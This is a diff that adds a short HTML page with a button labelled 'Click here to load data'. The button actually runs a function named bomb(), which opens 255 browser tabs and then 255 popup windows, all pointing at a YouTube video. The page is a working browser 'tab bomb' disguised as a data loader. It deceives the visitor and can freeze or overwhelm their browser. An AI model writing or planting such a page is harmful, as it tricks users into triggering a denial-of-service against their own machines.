@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>...</title>
+  </head>
+  <body>
+      <br/>
+      <br/>
+      <br/>
+      <br/>
+     <center>
+      <button onclick="bomb()" width="500px" height="500px">Click here to load data</button>
+     </center>
+     <script>
+     var url = "https://www.youtube.com/watch?v=-51AfyMqnpI";
+     function bomb() {
+       for (let i = 0; i < 255; i++) {
+         window.open(url, '_blank');
+       } 
+       for (let j = 0; j < 255; j++) {
+         window.open(url, "", "width=200,height=100");
+       }
+     }
+     </script>
+  </body>
+</html>
